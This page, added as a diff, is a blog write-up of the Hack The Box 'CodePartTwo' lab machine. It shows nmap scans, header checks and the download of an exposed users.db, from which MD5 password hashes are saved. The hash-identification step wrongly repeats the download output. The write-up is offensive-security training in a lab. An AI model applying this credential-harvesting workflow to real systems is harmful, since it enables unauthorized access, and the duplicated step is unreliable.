@@ -1,0 +1,1080 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>CodePartTwo</title> <meta name="description" content="Exfilitrated Exposed Users Database."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="CodePartTwo"> <meta property="og:description" content="Exfilitrated Exposed Users Database."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/90_codeparttwo/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="CodePartTwo"> <meta name="twitter:description" content="Exfilitrated Exposed Users Database."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Exfilitrated Exposed Users Database."
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CodePartTwo | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Exfilitrated Exposed Users Database."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/90_codeparttwo/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>CodePartTwo</title> <meta name="description" content="Exfilitrated Exposed Users Database."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="CodePartTwo"> <meta property="og:description" content="Exfilitrated Exposed Users Database."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/90_codeparttwo/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="CodePartTwo"> <meta name="twitter:description" content="Exfilitrated Exposed Users Database."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Exfilitrated Exposed Users Database."
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">CodePartTwo</h1> <p class="post-description">Exfilitrated Exposed Users Database.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB CodePartTwo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/CodePartTwo" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> I don’t know about you but it is time to tackle CodePartTwo.</p> <p>The first step is always to run nmap and identify those services.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41340"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41340')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41340')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41340')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41340')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41340">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.82
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 01:21 AEDT
+Nmap scan report for 10.10.11.82
+Host is up (0.33s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Welcome to CodePartTwo
+8001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+|_http-title: Directory listing for /
+|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT       ADDRESS
+1   427.84 ms 10.10.16.1
+2   195.34 ms 10.10.11.82
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41340" onclick="terminalOverlayClose('bash-bash-41340')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41340')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41340')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41340')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41340" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.82
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 01:21 AEDT
+Nmap scan report for 10.10.11.82
+Host is up (0.33s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Welcome to CodePartTwo
+8001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+|_http-title: Directory listing for /
+|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT       ADDRESS
+1   427.84 ms 10.10.16.1
+2   195.34 ms 10.10.11.82
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
+</pre> </div> </div> <p><br> Run nmap against all of the ports to try to find unusual services.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4448"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4448')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4448')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4448')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4448')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4448">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.82
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 01:13 AEDT
+Nmap scan report for 10.10.11.82
+Host is up (0.39s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+8001/tcp open  vcom-tunnel
+
+Nmap done: 1 IP address (1 host up) scanned in 1507.35 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4448" onclick="terminalOverlayClose('bash-bash-4448')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4448')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4448')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4448')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4448" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.82
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 01:13 AEDT
+Nmap scan report for 10.10.11.82
+Host is up (0.39s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8000/tcp open  http-alt
+8001/tcp open  vcom-tunnel
+
+Nmap done: 1 IP address (1 host up) scanned in 1507.35 seconds
+</pre> </div> </div> <p><br> Curl the webserver running on port 8000 with the <code class="language-plaintext highlighter-rouge">-I</code> option to get the headers and try to identify technology.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4236"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4236')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4236')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4236')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4236')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4236">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ curl -I http://10.10.11.82:8000
+HTTP/1.1 200 OK
+Server: gunicorn/20.0.4
+Date: Wed, 15 Oct 2025 14:26:34 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 2212
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4236" onclick="terminalOverlayClose('bash-bash-4236')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4236')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4236')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4236')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4236" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ curl -I http://10.10.11.82:8000
+HTTP/1.1 200 OK
+Server: gunicorn/20.0.4
+Date: Wed, 15 Oct 2025 14:26:34 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 2212
+</pre> </div> </div> <p><br> Curl the webserver running on port 8001 with the <code class="language-plaintext highlighter-rouge">-I</code> option to get the headers and try to identify technology</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4230"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4230')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4230')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4230')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4230')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4230">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ curl -I http://10.10.11.82:8001
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.8.10
+Date: Wed, 15 Oct 2025 14:26:41 GMT
+Content-type: text/html; charset=utf-8
+Content-Length: 338
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4230" onclick="terminalOverlayClose('bash-bash-4230')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4230')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4230')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4230')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4230" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ curl -I http://10.10.11.82:8001
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.8.10
+Date: Wed, 15 Oct 2025 14:26:41 GMT
+Content-type: text/html; charset=utf-8
+Content-Length: 338
+</pre> </div> </div> <p><br> Checked the landing page that is running on port 8000.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/landingpage8000.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page 8000" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Also, check the landing page that is running on port 8001.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/landingpage8001.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page 8001" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the users.db database from the index.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4630"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4630')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4630')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4630')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4630')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4630">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ wget http://10.10.11.82:8001/users.db                    
+--2025-10-16 01:29:58--  http://10.10.11.82:8001/users.db
+Connecting to 10.10.11.82:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16384 (16K) [application/octet-stream]
+Saving to: ‘users.db’
+
+users.db                                                   100%[========================================================================================================================================&gt;]  16.00K  42.0KB/s    in 0.4s    
+
+2025-10-16 01:29:59 (42.0 KB/s) - ‘users.db’ saved [16384/16384]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4630" onclick="terminalOverlayClose('bash-bash-4630')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4630')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4630')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4630')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4630" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ wget http://10.10.11.82:8001/users.db                    
+--2025-10-16 01:29:58--  http://10.10.11.82:8001/users.db
+Connecting to 10.10.11.82:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16384 (16K) [application/octet-stream]
+Saving to: ‘users.db’
+
+users.db                                                   100%[========================================================================================================================================&gt;]  16.00K  42.0KB/s    in 0.4s    
+
+2025-10-16 01:29:59 (42.0 KB/s) - ‘users.db’ saved [16384/16384]
+</pre> </div> </div> <p><br> Open the db in SqliteBrowswer.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/opendb.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Open DB" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Browse the data in user table.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/usertable.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="User Table" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Save the password to a file.</p> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">passwords.txt</span> </div> <pre class="codebox__body">
+marco:649c9d65a206a75f5abe509fe128bce5
+app:a97588c0e2fa3a024876339e27aeb42e
+</pre> </div> <p><br> Identify the type of hash.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4630"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4630')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4630')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4630')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4630')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4630">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ wget http://10.10.11.82:8001/users.db                    
+--2025-10-16 01:29:58--  http://10.10.11.82:8001/users.db
+Connecting to 10.10.11.82:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16384 (16K) [application/octet-stream]
+Saving to: ‘users.db’
+
+users.db                                                   100%[========================================================================================================================================&gt;]  16.00K  42.0KB/s    in 0.4s    
+
+2025-10-16 01:29:59 (42.0 KB/s) - ‘users.db’ saved [16384/16384]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4630" onclick="terminalOverlayClose('bash-bash-4630')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4630')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4630')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4630')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4630" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ wget http://10.10.11.82:8001/users.db                    
+--2025-10-16 01:29:58--  http://10.10.11.82:8001/users.db
+Connecting to 10.10.11.82:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16384 (16K) [application/octet-stream]
+Saving to: ‘users.db’
+
+users.db                                                   100%[========================================================================================================================================&gt;]  16.00K  42.0KB/s    in 0.4s    
+
